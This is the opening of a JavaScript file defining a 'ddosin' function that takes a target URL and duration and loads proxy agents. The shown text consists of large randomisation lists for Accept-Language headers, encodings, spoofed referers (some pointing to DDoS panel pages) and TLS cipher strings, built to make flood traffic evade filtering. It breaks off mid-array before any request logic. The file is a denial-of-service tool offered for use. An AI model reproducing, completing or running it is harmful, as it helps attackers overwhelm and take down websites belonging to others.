const fs = require('fs');
const axios = require('axios');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');

function ddosin(targetUrl, durasi){

 const langHeader = [
 "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
 "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
 "en-US,en;q=0.5", "en-US,en;q=0.9",
 "de-CH;q=0.7",
 "da, en-gb;q=0.8, en;q=0.7",
 "cs;q=0.5",
 'en-US,en;q=0.9',
'en-GB,en;q=0.9',
'en-CA,en;q=0.9',
'en-AU,en;q=0.9',
'en-NZ,en;q=0.9',
'en-ZA,en;q=0.9',
'en-IE,en;q=0.9',
'en-IN,en;q=0.9',
'ar-SA,ar;q=0.9',
'az-Latn-AZ,az;q=0.9',
'be-BY,be;q=0.9',
'bg-BG,bg;q=0.9',
'bn-IN,bn;q=0.9',
'ca-ES,ca;q=0.9',
'cs-CZ,cs;q=0.9',
'cy-GB,cy;q=0.9',
'da-DK,da;q=0.9',
'de-DE,de;q=0.9',
'el-GR,el;q=0.9',
'es-ES,es;q=0.9',
'et-EE,et;q=0.9',
'eu-ES,eu;q=0.9',
'fa-IR,fa;q=0.9',
'fi-FI,fi;q=0.9',
'fr-FR,fr;q=0.9',
'ga-IE,ga;q=0.9',
'gl-ES,gl;q=0.9',
'gu-IN,gu;q=0.9',
'he-IL,he;q=0.9',
'hi-IN,hi;q=0.9',
'hr-HR,hr;q=0.9',
'hu-HU,hu;q=0.9',
'hy-AM,hy;q=0.9',
'id-ID,id;q=0.9',
'is-IS,is;q=0.9',
'it-IT,it;q=0.9',
'ja-JP,ja;q=0.9',
'ka-GE,ka;q=0.9',
'kk-KZ,kk;q=0.9',
'km-KH,km;q=0.9',
'kn-IN,kn;q=0.9',
'ko-KR,ko;q=0.9',
'ky-KG,ky;q=0.9',
'lo-LA,lo;q=0.9',
'lt-LT,lt;q=0.9',
'lv-LV,lv;q=0.9',
'mk-MK,mk;q=0.9',
'ml-IN,ml;q=0.9',
'mn-MN,mn;q=0.9',
'mr-IN,mr;q=0.9',
'ms-MY,ms;q=0.9',
'mt-MT,mt;q=0.9',
'my-MM,my;q=0.9',
'nb-NO,nb;q=0.9',
'ne-NP,ne;q=0.9',
'nl-NL,nl;q=0.9',
'nn-NO,nn;q=0.9',
'or-IN,or;q=0.9',
'pa-IN,pa;q=0.9',
'pl-PL,pl;q=0.9',
'pt-BR,pt;q=0.9',
'pt-PT,pt;q=0.9',
'ro-RO,ro;q=0.9',
'ru-RU,ru;q=0.9',
'si-LK,si;q=0.9',
'sk-SK,sk;q=0.9',
'sl-SI,sl;q=0.9',
'sq-AL,sq;q=0.9',
'sr-Cyrl-RS,sr;q=0.9',
'sr-Latn-RS,sr;q=0.9',
'sv-SE,sv;q=0.9',
'sw-KE,sw;q=0.9',
'ta-IN,ta;q=0.9',
'te-IN,te;q=0.9',
'th-TH,th;q=0.9',
'tr-TR,tr;q=0.9',
'uk-UA,uk;q=0.9',
'ur-PK,ur;q=0.9',
'uz-Latn-UZ,uz;q=0.9',
'vi-VN,vi;q=0.9',
'zh-CN,zh;q=0.9',
'zh-HK,zh;q=0.9',
'zh-TW,zh;q=0.9',
'am-ET,am;q=0.8',
'as-IN,as;q=0.8',
'az-Cyrl-AZ,az;q=0.8',
'bn-BD,bn;q=0.8',
'bs-Cyrl-BA,bs;q=0.8',
'bs-Latn-BA,bs;q=0.8',
'dz-BT,dz;q=0.8',
'fil-PH,fil;q=0.8',
'fr-CA,fr;q=0.8',
'fr-CH,fr;q=0.8',
'fr-BE,fr;q=0.8',
'fr-LU,fr;q=0.8',
'gsw-CH,gsw;q=0.8',
'ha-Latn-NG,ha;q=0.8',
'hr-BA,hr;q=0.8',
'ig-NG,ig;q=0.8',
'ii-CN,ii;q=0.8',
'is-IS,is;q=0.8',
'jv-Latn-ID,jv;q=0.8',
'ka-GE,ka;q=0.8',
'kkj-CM,kkj;q=0.8',
'kl-GL,kl;q=0.8',
'km-KH,km;q=0.8',
'kok-IN,kok;q=0.8',
'ks-Arab-IN,ks;q=0.8',
'lb-LU,lb;q=0.8',
'ln-CG,ln;q=0.8',
'mn-Mong-CN,mn;q=0.8',
'mr-MN,mr;q=0.8',
'ms-BN,ms;q=0.8',
'mt-MT,mt;q=0.8',
'mua-CM,mua;q=0.8',
'nds-DE,nds;q=0.8',
'ne-IN,ne;q=0.8',
'nso-ZA,nso;q=0.8',
'oc-FR,oc;q=0.8',
'pa-Arab-PK,pa;q=0.8',
'ps-AF,ps;q=0.8',
'quz-BO,quz;q=0.8',
'quz-EC,quz;q=0.8',
'quz-PE,quz;q=0.8',
'rm-CH,rm;q=0.8',
'rw-RW,rw;q=0.8',
'sd-Arab-PK,sd;q=0.8',
'se-NO,se;q=0.8',
'si-LK,si;q=0.8',
'smn-FI,smn;q=0.8',
'sms-FI,sms;q=0.8',
'syr-SY,syr;q=0.8',
'tg-Cyrl-TJ,tg;q=0.8',
'ti-ER,ti;q=0.8',
'te;q=0.9,en-US;q=0.8,en;q=0.7',
'tk-TM,tk;q=0.8',
'tn-ZA,tn;q=0.8',
'tt-RU,tt;q=0.8',
'ug-CN,ug;q=0.8',
'uz-Cyrl-UZ,uz;q=0.8',
've-ZA,ve;q=0.8',
'wo-SN,wo;q=0.8',
'xh-ZA,xh;q=0.8',
'yo-NG,yo;q=0.8',
'zgh-MA,zgh;q=0.8',
'zu-ZA,zu;q=0.8',
];
const encodingHeader = [
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  '*'
];
 const refers = [
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://coccoc.com/search#query=",
     "http://ddosvn.somee.com/f5.php?v=",
     "http://engadget.search.aol.com/search?q=",
     "http://engadget.search.aol.com/search?q=query?=query=&q=",
     "http://eu.battle.net/wow/en/search?q=",
     "http://filehippo.com/search?q=",
     "http://funnymama.com/search?q=",
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
     "http://go.mail.ru/search?mail.ru=1&q=",
     "http://help.baidu.com/searchResult?keywords=",
     "http://host-tracker.com/check_page/?furl=",
     "http://itch.io/search?q=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://jobs.bloomberg.com/search?q=",
     "http://jobs.leidos.com/search?q=",
     "http://jobs.rbs.com/jobs/search?q=",
     "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
     "http://louis-ddosvn.rhcloud.com/f5.html?v=",
     "http://millercenter.org/search?q=",
     "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
     "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
     "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
     "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
     "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
     "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
     "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
     "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
     "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
     "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
     "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
     "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
     "http://search.aol.com/aol/search?q=",
     "http://taginfo.openstreetmap.org/search?q=",
     "http://techtv.mit.edu/search?q=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://vk.com/profile.php?redirect=",
     "http://www.ask.com/web?q=",
     "http://www.baoxaydung.com.vn/news/vn/search&q=",
     "http://www.bestbuytheater.com/events/search?q=",
     "http://www.bing.com/search?q=",
     "http://www.evidence.nhs.uk/search?q=",
     "http://www.google.com/?q=",
     "http://www.google.com/translate?u=",
     "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
     "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
     "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
     "http://www.pagescoring.com/website-speed-test/?url=",
     "http://www.reddit.com/search?q=",
     "http://www.search.com/search?q=",
     "http://www.shodanhq.com/search?q=",
     "http://www.ted.com/search?q=",
     "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
     "http://www.usatoday.com/search/results?q=",
     "http://www.ustream.tv/search?q=",
     "http://yandex.ru/yandsearch?text=",
     "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
     "http://ytmnd.com/search?q=",
     "https://add.my.yahoo.com/rss?url=",
     "https://careers.carolinashealthcare.org/search?q=",
     "https://check-host.net/",
     "https://developers.google.com/speed/pagespeed/insights/?url=",
     "https://drive.google.com/viewerng/viewer?url=",
     "https://duckduckgo.com/?q=",
     "https://google.com/",
     "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
     "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
     "https://help.baidu.com/searchResult?keywords=",
     "https://play.google.com/store/search?q=",
     "https://pornhub.com/",
     "https://r.search.yahoo.com/",
     "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
     "https://steamcommunity.com/market/search?q=",
     "https://vk.com/profile.php?redirect=",
     "https://www.bing.com/search?q=",
     "https://www.cia.gov/index.html",
     "https://www.facebook.com/",
     "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
     "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
     "https://www.fbi.com/",
     "https://www.google.ad/search?q=",
     "https://www.google.ae/search?q=",
     "https://www.google.al/search?q=",
     "https://www.google.co.ao/search?q=",
     "https://www.google.com.af/search?q=",
     "https://www.google.com.ag/search?q=",
     "https://www.google.com.ai/search?q=",
     "https://www.google.com/search?q=",
     "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
     "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
     "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
     "https://www.npmjs.com/search?q=",
     "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
     "https://www.pinterest.com/search/?q=",
     "https://www.qwant.com/search?q=",
     "https://www.ted.com/search?q=",
     "https://www.usatoday.com/search/results?q=",
     "https://www.yandex.com/yandsearch?text=",
     "https://www.youtube.com/",
     "https://yandex.ru/"
 ];
  const cplist = [
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
     "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-SHA", "ECDHE-RSA-AES128-SHA", "AES128-GCM-SHA256", "AES128-SHA256", "AES128-SHA", "ECDHE-RSA-AES256-SHA", "AES256-GCM-SHA384", "AES256-SHA256", "AES256-SHA",
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",

  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',

  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",

  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',


  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
